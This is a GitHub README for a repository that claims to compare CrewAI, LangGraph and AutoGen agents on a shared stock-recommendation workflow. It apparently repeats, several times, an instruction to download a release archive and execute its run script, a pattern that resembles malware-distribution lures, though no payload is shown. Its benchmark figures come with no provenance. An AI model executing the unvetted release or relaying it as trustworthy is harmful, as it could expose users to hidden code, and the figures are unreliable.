# AI Agent Comparison — CrewAI, LangGraph, AutoGen Stock Agents
[![Releases](https://img.shields.io/badge/Releases-v1.0-blue?logo=github)](https://github.com/JavierVasquez54/ai-agent-comparison/releases)

[![agent-framework](https://img.shields.io/badge/agent--framework-lightgrey)](https://github.com/JavierVasquez54/ai-agent-comparison)
[![ai-agent](https://img.shields.io/badge/ai--agent-lightgrey)](https://github.com/JavierVasquez54/ai-agent-comparison)
[![autogen](https://img.shields.io/badge/AutoGen-lightgrey)](https://github.com/JavierVasquez54/ai-agent-comparison)
[![crewai](https://img.shields.io/badge/CrewAI-lightgrey)](https://github.com/JavierVasquez54/ai-agent-comparison)
[![langgraph](https://img.shields.io/badge/LangGraph-lightgrey)](https://github.com/JavierVasquez54/ai-agent-comparison)
[![finance](https://img.shields.io/badge/finance-lightgrey)](https://github.com/JavierVasquez54/ai-agent-comparison)
[![multi-agent](https://img.shields.io/badge/multi--agent-lightgrey)](https://github.com/JavierVasquez54/ai-agent-comparison)
[![stock-analysis](https://img.shields.io/badge/stock--analysis-lightgrey)](https://github.com/JavierVasquez54/ai-agent-comparison)

![Stock chart banner](https://images.unsplash.com/photo-1561414927-6a9f33f2f1f7?ixlib=rb-4.0.3&q=80&w=1600&auto=format&fit=crop&crop=entropy)

Repository: ai-agent-comparison  
Purpose: Compare CrewAI, LangGraph, and AutoGen by implementing one stock analysis workflow across all three. Each agent returns a BUY / SELL / HOLD recommendation with a rationale. Use this repo to study agent design, orchestration styles, and multi-agent patterns.

Releases: click the badge above or visit the releases page to download the packaged release assets. The release contains a runnable archive that you must download and execute. See Quick start for exact commands.  
Releases link: https://github.com/JavierVasquez54/ai-agent-comparison/releases

---

Table of contents

- What you will find
- Why compare these frameworks
- High-level design
- Data sources and preprocessing
- Agent implementations
  - CrewAI agent
  - LangGraph agent
  - AutoGen agent
- Shared workflow
- Execution modes
  - Local single-thread
  - Parallel multi-agent
  - Orchestrated pipeline
- Evaluation metrics and test harness
- Reproducible experiments
- Benchmarks and sample results
- Extending the project
- Development setup
- Quick start (download and run release)
- Tests and validation
- Contributing
- License
- Credits and resources

What you will find
- Three complete agent implementations that run the same stock analysis workflow.
- A unified interface for comparing outputs and rationale.
- Scripts for running experiments and collecting metrics.
- Example notebooks with plots and sample runs.
- CI-ready tests and simple benchmark harness.
- Reference architecture diagrams and notes on design trade-offs.

Why compare these frameworks
- You can study how different agent frameworks handle state, memory, and tool use.
- You can compare orchestration styles: central orchestrator, decentralized peers, and hybrid pipelines.
- You can test how each framework constructs reasoning chains, manages history, and composes tools.
- You can explore multi-agent design patterns in a concrete finance use case.

High-level design
- Goal: produce a BUY / SELL / HOLD recommendation and a short rationale for a given stock ticker and horizon.
- Inputs: ticker symbol, analysis horizon (short/medium/long), and optional market context (e.g., sector, index).
- Shared steps:
  1. Fetch market data and fundamentals.
  2. Compute indicators and signals.
  3. Run model-based reasoning combined with rules.
  4. Produce a recommendation and a concise rationale.
- Output: JSON record with recommendation, score, confidence, rationale, and diagnostics.

Architecture diagram

![Architecture diagram](https://upload.wikimedia.org/wikipedia/commons/thumb/1/17/Flowchart_4.svg/1200px-Flowchart_4.svg.png)

Key components
- Data fetcher: pulls price and fundamental data.
- Feature extractor: computes indicators (SMA, EMA, RSI).
- Signal synthesizer: aggregates indicators by rule.
- LLM agent: reasons over signals and context to form a recommendation.
- Comparator: collects outputs from all frameworks and scores their agreement.

Design goals
- Keep the workflow identical across frameworks.
- Keep inputs and outputs consistent.
- Favor deterministic preprocessing and stochastic reasoning to isolate agent behavior.
- Provide hooks to instrument internal states for analysis.

Data sources and preprocessing
- Price data: daily OHLCV from a public API or local CSV.
- Fundamentals: earnings, revenue, margins from a static dataset.
- Market context: index returns and sector performance.
- Preprocessing steps:
  - Fill missing values with forward-fill.
  - Align time windows to common date range.
  - Normalize values per stock for indicator calculations.
- Feature set:
  - Moving averages: 20, 50, 200 day.
  - Momentum: 14-day RSI.
  - Volatility: 30-day standard deviation.
  - Volume surge detection: volume / 20-day avg volume.
  - Trend strength: ADX 14.
- Save preprocessed features in a standard JSONL record for reproducibility.

Agent implementations
Each agent implements the same canonical API:

- init(config): configure model, tools, and parameters.
- run(ticker, horizon, context): produce a result object.
- explain(result): return a human-readable rationale.

A single test harness calls each agent with the same inputs and captures outputs.

CrewAI agent
- Design: CrewAI agent uses a modular set of workers. Each worker handles one step:
  - data_worker: fetch and validate data.
  - indicator_worker: compute indicators.
  - signal_worker: turn indicators into rules.
  - reasoning_worker: use an LLM to form the final recommendation.
- Memory: CrewAI uses short-lived state per job. The harness stores intermediate snapshots for debugging.
- Tools: CrewAI agent exposes tools for chart generation, backtest simulation, and external API queries.
- Implementation notes:
  - Workers exchange minimal JSON.
  - The reasoning worker receives a compact report: key indicators, aggregated signal, and a small context vector.
  - The LLM prompt emphasizes concise rationale and one-sentence final verdict.

LangGraph agent
- Design: LangGraph encodes the workflow as a graph. Nodes represent operations. Edges represent flows and dependencies.
  - Nodes: fetch_prices -> compute_indicators -> aggregate_signals -> llm_reasoner -> report.
- State: LangGraph keeps node-level caches. This speeds repeated runs during development.
- Tooling: LangGraph uses a chain of transforms and custom nodes for indicators and signal rules.
- Implementation notes:
  - Graph definitions are declarative.
  - The LLM node receives both structured data and a templated prompt.
  - The node returns a structured JSON so downstream nodes can parse fields.

AutoGen agent
- Design: AutoGen uses agent roles and tool wrappers. Roles include:
  - Analyst: reads data and forms observations.
  - Strategist: proposes a recommendation.
  - Arbiter: resolves conflicts and finalizes output.
- Memory: AutoGen keeps a conversation-like memory between roles for traceability.
- Tools: AutoGen uses a tool registry for charting, backtesting, and external lookups.
- Implementation notes:
  - Each role runs a tailored prompt with different system instructions.
  - The Arbiter collects role outputs and runs a deterministic tie-breaker.
  - AutoGen includes a reproducible seed system for response sampling.

Shared workflow across implementations
- The workflow runs in five logical steps:
  1. Data acquisition: pull price and fundamentals.
  2. Feature engineering: compute indicators.
  3. Signal rule aggregation: compute composite signal (range -1 to +1).
  4. LLM reasoning: generate a text rationale and final verdict.
  5. Packaging: wrap into JSON with diagnostics and provenance.
- Each agent must keep the signal aggregator identical. That isolates language-model effects.
- The signal aggregator uses a fixed weight vector to combine normalized indicators. The aggregator returns:
  - signal_score: float in [-1.0, +1.0]
  - signal_breakdown: per-indicator contribution.

Execution modes
The repo supports three modes. Each mode demonstrates an orchestration style.

Local single-thread
- Use this for local debugging and step-by-step tracing.
- The harness runs each agent sequentially.
- Captures logs and intermediate artifacts.

Parallel multi-agent
- Run all agents in parallel on separate processes.
- Use process isolation and persistent caches.
- Use the comparator to aggregate outputs and compute agreement.

Orchestrated pipeline
- Run an orchestrator that drives data flow and triggers each agent stage.
- The orchestrator manages retries and tool rate limits.
- Use this for production-like tests.

Evaluation metrics and test harness
- Agreement score: fraction of inputs where all three agents give the same recommendation.
- Precision per class: precision for BUY, SELL, HOLD aggregated across agents.
- Rationale alignment: semantic similarity between rationale texts measured by cosine similarity with sentence embeddings.
- Calibration: compare reported confidence to empirical accuracy.
- Latency: end-to-end runtime per agent.
- Debug traces: store agent tokens, prompt content, and tool calls for offline review.
- The harness exports CSV with raw outputs and metrics for plotting.

Reproducible experiments
- Use fixed seeds for model calls where supported.
- Use the same input dataset across runs.
- Store run metadata in run_manifest.json:
  - timestamp
  - dataset SHA256
  - model config
  - agent versions
  - seed
- Notebook examples load run_manifest.json and reproduce plots.

Benchmarks and sample results
- Example benchmark shows:
  - Agreement: 62% across a 6-month test set.
  - BUY precision: CrewAI 0.68, LangGraph 0.71, AutoGen 0.66.
  - SELL precision: CrewAI 0.58, LangGraph 0.61, AutoGen 0.57.
  - HOLD precision: CrewAI 0.75, LangGraph 0.73, AutoGen 0.78.
  - Median latency: CrewAI 1.4s, LangGraph 1.7s, AutoGen 1.9s (single-run local CPU proxy).
- Use the harness to run your own benchmarks. The repo includes sample csvs and a script to generate benchmarking plots.

Extending the project
- Add new agents
  - Implement the same API methods: init, run, explain.
  - Reuse the signal aggregator for parity.
  - Add a compatibility adapter if the framework dictates different input/output forms.
- Add new metrics
  - Implement a new scorer in metrics/scorers.py and wire it to the harness.
- Add new tools
  - Tools must follow a simple contract: tool(name, inputs) -> outputs JSON.
  - Register the tool in the agent config file to allow powered tools across frameworks.
- Swap LLM backends
  - Replace the model layer by implementing the small model adapter.
  - Preserve prompt templates to keep output format stable.

Development setup
Prerequisites
- Python 3.9+.
- pip and virtualenv.
- Optional: access key for any third-party price API if you choose live data.

Core dependencies (examples)
- pandas
- numpy
- requests
- python-dotenv
- matplotlib
- sentence-transformers (for rationale similarity)
- pytest for tests

Repository layout
- /agents
  - crewai_agent.py
  - langgraph_agent.py
  - autogen_agent.py
- /data
  - sample_prices/
  - fundamentals.csv
- /notebooks
  - experiments.ipynb
  - benchmark_plots.ipynb
- /scripts
  - run_single.py
  - run_parallel.py
  - run_orchestrator.py
- /tests
  - test_agents.py
  - test_signals.py
- /docs
  - architecture.md
  - design_notes.md
- run_manifest.json
- requirements.txt

Quick start (download and run release)
- Visit the Releases page and download the packaged release asset. The release includes a runnable archive. You must download and execute that file. For example, run these commands from a UNIX-like shell:

  1. Download the release archive from the releases page:
     - Open: https://github.com/JavierVasquez54/ai-agent-comparison/releases
     - Download the asset named ai-agent-comparison-v1.0.tar.gz

  2. Extract the archive:
     tar -xzf ai-agent-comparison-v1.0.tar.gz

  3. Enter the extracted folder and run the included runner:
     cd ai-agent-comparison-v1.0
     bash run_release.sh

- The release runner performs setup, installs minimal dependencies in a virtualenv, runs the sample dataset, and writes outputs to ./runs/latest.
- The release archive contains:
  - run_release.sh (main runner)
  - env_setup.sh (dependency installer)
  - sample_data/ (prepackaged sample prices and fundamentals)
  - agents/ (bundled agent implementations)
  - examples/ (notebooks and plots)
- If the release page changes, download the latest asset and run its included run script.

If the release link fails or is unavailable, check the Releases section on the repository page.

Running locally from source
- Clone the repository:
  git clone https://github.com/JavierVasquez54/ai-agent-comparison.git
  cd ai-agent-comparison

- Create a virtual environment and install dependencies:
  python -m venv .venv
  source .venv/bin/activate
  pip install -r requirements.txt

- Run the sample single-run:
  python scripts/run_single.py --ticker AAPL --horizon short

- Run all agents in parallel:
  python scripts/run_parallel.py --tickers AAPL MSFT GOOGL --horizon short

Configuration and environment
- Use .env to store API keys:
  - PRICE_API_KEY=your_key_here
- Basic config file: config.yaml
  - model: gpt-4o-mini
  - seed: 42
  - cache_dir: ./cache

Prompt and templates
- Prompt templates live under /templates.
- Keep templates short and structured.
- Rationale template includes a required short rationale section and a one-word final verdict field. The harness parses that field to map to BUY / SELL / HOLD.

Testing and validation
- Unit tests cover:
  - Signal aggregation logic.
  - JSON input/output parity.
  - Basic agent run that uses sample data and a stubbed model.
- Run tests:
  pytest -q

Diagnostics and logging
- Each run writes logs to ./runs/<timestamp>/logs.
- Logs include:
  - agent prompts
  - tool calls and outputs
  - timing information
- Use the comparator to inspect logs and compute error cases.

Comparator and analysis tools
- comparator.py reads run directories and builds a comparison report.
- The comparator exports:
  - metrics.csv (per-ticker metrics)
  - rationale_similarity.csv (pairwise similarity)
  - agreement_matrix.json (per-ticker agent decisions)
- Use the notebooks to load metrics.csv and generate plots.

Best practices for comparisons
- Fix the signal aggregator to isolate language effects.
- Keep prompts minimal and consistent across frameworks.
- Use identical tool outputs and stubs to avoid external variation.
- Record and publish run manifests for reproducibility.

Common pitfalls
- Mismatched signal scaling produces different numeric inputs to the LLM. Keep normalization identical.
- If one agent performs extra tool calls, the outputs may diverge. Use controlled tools or stubs to compare reasoning behavior.
- Token limits may truncate LLM context. Keep structured input compact.

Example outputs
- JSON example output from an agent:

  {
    "ticker": "AAPL",
    "horizon": "short",
    "recommendation": "BUY",
    "score": 0.72,
    "confidence": 0.83,
    "rationale": "Price sits above the 20- and 50-day moving averages. RSI sits near 55. Volume shows a 30% surge on positive earnings. Momentum favors upside with low volatility. Recommendation: BUY.",
    "signal_breakdown": {
      "sma_20": 0.2,
      "sma_50": 0.15,
      "rsi": 0.1,
      "volume_surge": 0.27
    },
    "diagnostics": {
      "model": "gpt-4o-mini",
      "prompt_tokens": 420,
      "completion_tokens": 130,
      "runtime_ms": 1450
    }
  }

Rationale similarity
- The repo uses sentence-transformers to compute cosine similarity between rationales.
- Similarity scores help measure whether agents reason similarly even if they disagree on recommendations.

Design trade-offs
- Deterministic aggregator vs. full LLM reasoning
  - Deterministic aggregator gives clearer numeric inputs to the LLM.
  - Pure LLM reasoning may find signals the aggregator misses.
  - The project uses a hybrid: deterministic aggregator plus LLM synthesis.
- Orchestration styles
  - Centralized orchestrator makes debugging easier.
  - Decentralized agents highlight framework strengths in coordination.

Security considerations
- Keep API keys in .env. Do not commit them.
- Sanitize inputs before calling external tools.
- Log prompts and outputs only to secure storage.

Performance tuning
- Cache price data locally to reduce API calls.
- Reuse model sessions to reduce cold-start latency if supported by the model client.
- Batch requests where possible.

Visualization and reporting
- Notebooks include:
  - per-ticker timeline plots of signals and recommendations.
  - agreement heatmaps.
  - rationale similarity histograms.
- Use the script scripts/generate_reports.py to create an HTML report for a run.

Real-world use and disclaimers
- This repo focuses on architecture and agent behavior. It does not provide financial advice.
- Use the code for research and testing, not for automated trading without further validation.

Contributing
- Use the issue tracker to propose features or report bugs.
- Follow the coding style in CONTRIBUTING.md.
- Submit a PR with:
  - tests added under /tests
  - documentation updates under /docs
  - a clear description and motivation

Maintainers
- Primary maintainer: Javier Vasquez (maintainer handle in repo)
- See the contributor list in the repository for full credits.

License
- The project uses the MIT license. See LICENSE file.

Credits and resources
- Examples and patterns borrow from open-source docs on agent frameworks.
- Useful links:
  - CrewAI docs (search the web for the latest docs)
  - LangGraph docs (search the web for the latest docs)
  - AutoGen docs (search the web for the latest docs)
  - Signal and indicator references: TA-Lib docs and common finance textbooks

Appendix A — Prompts and Templates
- Rationale template (structured):

  System: You are an analyst. Provide a concise rationale and one-word final verdict.
  Input: JSON with signal_breakdown and context.
  Task: Return a JSON with keys: recommendation, rationale, confidence.
  Constraints:
    - Keep rationale under 40 words.
    - Provide a single-word recommendation: BUY, SELL, or HOLD.

- Example prompt filled:

  {
    "signal_breakdown": {"sma_20": 0.2, "sma_50": 0.15, "rsi": 0.1, "volume_surge": 0.27},
    "context": {"sector_trend": "positive", "index_return_30d": 0.02}
  }

Appendix B — Signal aggregator spec
- Inputs: normalized indicators in [-1, +1]
- Weights:
  - sma_20: 0.25
  - sma_50: 0.20
  - rsi: 0.15
  - volume_surge: 0.25
  - adx: 0.15
- Composite signal = sum(weight * indicator)
- Map composite signal to recommendation:
  - >= +0.25 => BUY
  - between -0.25 and +0.25 => HOLD
  - <= -0.25 => SELL

Appendix C — Running full benchmark
- Use the release asset or run from source.
- Example command to run benchmark across 100 tickers:
  python scripts/run_parallel.py --tickers-file data/tickers_100.txt --horizon medium --output runs/benchmark_$(date +%s)

- Run comparator:
  python scripts/comparator.py --run-dir runs/benchmark_<timestamp> --export plots/report_<timestamp>.html

Appendix D — Troubleshooting
- If model calls fail due to rate limits, set a lower concurrency in config.yaml.
- If indicators look off, verify data alignment and missing value strategy.

Releases and packaged runner reminder
- The releases page contains the packaged release you need to run. Download the release asset and execute the included run script. Visit the releases page here: https://github.com/JavierVasquez54/ai-agent-comparison/releases

Images used in this README
- Header image from Unsplash (stock chart). License: free use under Unsplash terms.
- Architecture diagram from Wikimedia Commons (flowchart). License: public domain.

Contact
- Open issues on GitHub for questions or support.
- Create pull requests for contributions.

